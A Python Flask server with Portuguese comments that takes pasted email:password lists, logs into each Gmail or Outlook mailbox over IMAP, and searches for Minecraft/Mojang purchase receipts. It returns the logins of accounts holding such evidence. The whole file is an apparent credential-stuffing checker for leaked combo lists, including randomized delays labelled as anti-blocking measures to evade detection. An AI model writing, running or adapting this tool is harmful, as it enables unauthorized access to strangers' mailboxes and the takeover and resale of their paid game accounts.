from flask import Flask, request, jsonify
from flask_cors import CORS
import imaplib, email, time, random
from email.header import decode_header

# --- CONFIGURAÇÕES ---
app = Flask(__name__)
CORS(app) # Permite a comunicação entre o site e este servidor

MIN_DELAY_SECONDS = 5
MAX_DELAY_SECONDS = 15
HIGH_VALUE_KEYWORDS = ["receipt", "recibo", "compra", "pedido", "order", "invoice", "confirmation"]
CONTEXT_KEYWORDS = ["minecraft", "mojang"]
TRUSTED_SENDERS = ["microsoft", "xbox", "mojang"]

# --- FUNÇÕES (as mesmas do script anterior) ---
def get_imap_host(email_address):
    domain = email_address.split('@')[-1].lower()
    if "gmail" in domain: return "imap.gmail.com"
    if "outlook" in domain or "hotmail" in domain or "live" in domain: return "outlook.office356.com"
    return None

def decode_str(s):
    try:
        parts = decode_header(s)
        return "".join(text.decode(enc or "utf-8", errors="replace") if isinstance(text, bytes) else text for text, enc in parts)
    except: return s

def score_email(msg):
    score = 0
    subject = decode_str(msg.get("Subject", "")).lower()
    frm = decode_str(msg.get("From", "")).lower()
    if any(sender in frm for sender in TRUSTED_SENDERS): score += 5
    if any(keyword in subject for keyword in HIGH_VALUE_KEYWORDS): score += 3
    if any(keyword in subject for keyword in CONTEXT_KEYWORDS): score += 2
    if score >= 10: score += 5
    return score

def process_account(email_addr, password):
    host = get_imap_host(email_addr)
    if not host: return {"status": "error", "message": "Host IMAP não encontrado"}
    
    try:
        conn = imaplib.IMAP4_SSL(host)
        conn.login(email_addr, password)
    except Exception as e:
        return {"status": "error", "message": f"Falha no login: {e}"}

    best_email = {"score": 0, "subject": "", "from": ""}
    try:
        conn.select("INBOX")
        typ, data = conn.search(None, '(OR SUBJECT "minecraft" SUBJECT "mojang")')
        if typ == "OK":
            for mid in data[0].split()[-10:]:
                _, msg_data = conn.fetch(mid, "(RFC822)")
                msg = email.message_from_bytes(msg_data[0][1])
                score = score_email(msg)
                if score > best_email["score"]:
                    best_email = {"score": score, "subject": decode_str(msg.get("Subject", "")), "from": decode_str(msg.get("From", ""))}
    finally:
        conn.logout()

    if best_email["score"] >= 8:
        return {"status": "success", "data": best_email}
    return {"status": "not_found", "message": "Nenhuma evidência relevante encontrada."}


# --- ROTA DA API ---
@app.route('/verificar', methods=['POST'])
def verificar_contas():
    data = request.get_json()
    accounts_text = data.get('accounts', '')
    
    if not accounts_text:
        return jsonify({"error": "A lista de contas está vazia."}), 400

    accounts = [line.strip() for line in accounts_text.split('\n') if ":" in line]
    found_accounts = []

    for account_line in accounts:
        email_addr, password = account_line.split(":", 1)
        
        result = process_account(email_addr, password)
        
        if result.get("status") == "success":
            found_accounts.append({
                "login": account_line,
                "evidence": result["data"]
            })
        
        # Pausa anti-bloqueio
        time.sleep(random.uniform(MIN_DELAY_SECONDS, MAX_DELAY_SECONDS))

    return jsonify({"found_accounts": found_accounts})

# --- INICIAR SERVIDOR ---
if __name__ == '__main__':
    print("Servidor iniciado em http://127.0.0.1:5000")
    print("Abra o arquivo index.html no seu navegador para usar a interface.")
    app.run(port=5000)
